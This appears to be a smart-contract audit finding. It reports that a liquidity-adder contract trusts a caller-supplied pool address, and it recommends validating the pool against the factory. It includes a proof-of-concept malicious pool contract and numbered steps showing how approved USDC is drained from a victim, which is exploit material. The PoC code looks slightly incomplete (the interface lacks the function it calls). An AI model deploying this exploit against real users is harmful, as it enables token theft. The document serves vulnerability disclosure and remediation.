### Title
Unvalidated `pool` Parameter in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller without verifying it against the factory. Because the callback `metricOmmModifyLiquidityCallback` trusts the stored pool address as the sole authentication gate, a malicious pool can call back with attacker-controlled token addresses (via `getImmutables()`) and attacker-controlled amounts (up to the user-supplied caps), draining any ERC-20 tokens the victim has approved to the adder.

---

### Finding Description

`addLiquidityExactShares` and `addLiquidityWeighted` accept a caller-supplied `pool` address and immediately store it as the authoritative callback caller in transient storage via `_setPayContext`: [1](#0-0) 

The contract's own NatSpec acknowledges the gap: [2](#0-1) 

Inside `metricOmmModifyLiquidityCallback`, the only authentication check is `msg.sender != expectedPool`, where `expectedPool` is the attacker-supplied address: [3](#0-2) 

After passing that check, the callback calls `IMetricOmmPool(msg.sender).getImmutables()` to resolve `token0`/`token1` — both values are fully controlled by the malicious pool: [4](#0-3) 

The `pay` call then transfers those attacker-chosen tokens from the victim (`payer = msg.sender` of the original call) to the malicious pool (`msg.sender` of the callback).

---

### Impact Explanation

Any user who has granted a standing ERC-20 approval to `MetricOmmPoolLiquidityAdder` (e.g., `type(uint256).max` for USDC, WETH, or any other token) can have those tokens drained in a single transaction. The attacker controls:

1. **Which tokens are pulled** — via `getImmutables()` returning arbitrary `token0`/`token1`.
2. **How much is pulled** — up to the victim-supplied `maxAmountToken0`/`maxAmountToken1` caps, which users typically set to their full intended deposit.

Loss is direct, immediate, and bounded only by the victim's approval and the caps they pass.

---

### Likelihood Explanation

- The attack requires no privileged role; any unprivileged attacker can deploy a malicious pool contract.
- The victim only needs to call `addLiquidityExactShares` or `addLiquidityWeighted` with the malicious pool address — achievable via phishing, a malicious front-end, or a crafted referral link.
- Standing `type(uint256).max` approvals are standard practice for DeFi UIs, making the victim pool large.

---

### Recommendation

Validate the `pool` parameter against the canonical `MetricOmmPoolFactory` before storing it in transient context, analogous to how the router validates the callback caller against the factory-derived pool address. Concretely:

```solidity
// In _addLiquidity (or at the top of each public entry point):
if (!IMetricOmmPoolFactory(factory).isPool(pool)) revert UnauthorizedPool(pool);
```

Store the `factory` address as an immutable in the constructor (mirroring `MetricOmmSwapRouterBase`). This ensures only pools deployed by the trusted factory can trigger token pulls.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

interface ILiquidityAdder {
    function addLiquidityExactShares(
        address pool, address owner, uint80 salt,
        LiquidityDelta calldata deltas,
        uint256 maxAmountToken0, uint256 maxAmountToken1,
        bytes calldata extensionData
    ) external payable returns (uint256, uint256);
}

contract MaliciousPool {
    address public immutable victim;
    address public immutable drainToken;   // e.g. USDC victim approved
    address public immutable adder;

    constructor(address _victim, address _drainToken, address _adder) {
        victim = _victim; drainToken = _drainToken; adder = _adder;
    }

    // Called by LiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, bytes calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Callback into adder with KIND_PAY (1) and full cap amounts
        ILiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1_000_000e6, // amount0Delta = maxAmountToken0 victim passed
            0,
            abi.encode(uint8(1)) // KIND_PAY
        );
        return (1_000_000e6, 0);
    }

    // Called by adder inside callback to resolve token addresses
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = drainToken; // attacker picks any token victim approved
        imm.token1 = address(0);
    }
}

// Attack:
// 1. Deploy MaliciousPool(victim, USDC, adder)
// 2. victim.call: adder.addLiquidityExactShares(
//        maliciousPool, victim, 0, deltas,
//        1_000_000e6,  // maxAmountToken0 — victim's intended deposit cap
//        0, ""
//    )
// 3. MaliciousPool.addLiquidity fires, calls metricOmmModifyLiquidityCallback
// 4. Adder checks msg.sender == expectedPool (maliciousPool) ✓
// 5. Adder calls maliciousPool.getImmutables() → token0 = USDC
// 6. Adder calls pay(USDC, victim, maliciousPool, 1_000_000e6)
// 7. 1,000,000 USDC transferred from victim to attacker
``` [5](#0-4) [6](#0-5)

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L152-178)
```text
  function metricOmmModifyLiquidityCallback(uint256 amount0Delta, uint256 amount1Delta, bytes calldata callbackData)
    external
    override
  {
    uint8 kind = abi.decode(callbackData, (uint8));
    if (kind == KIND_PROBE) {
      revert LiquidityProbe(amount0Delta, amount1Delta);
    }
    if (kind != KIND_PAY) revert InvalidCallbackKind();

    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
    _clearPayContext();
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L290-296)
```text
  function _setPayContext(address pool, address payer, uint256 maxAmountToken0, uint256 maxAmountToken1) internal {
    if (_tloadAddress(T_SLOT_PAY_POOL) != address(0)) revert PayContextAlreadyActive();
    _tstoreAddress(T_SLOT_PAY_POOL, pool);
    _tstoreAddress(T_SLOT_PAY_PAYER, payer);
    _tstore(T_SLOT_PAY_MAX0, maxAmountToken0);
    _tstore(T_SLOT_PAY_MAX1, maxAmountToken1);
  }
```
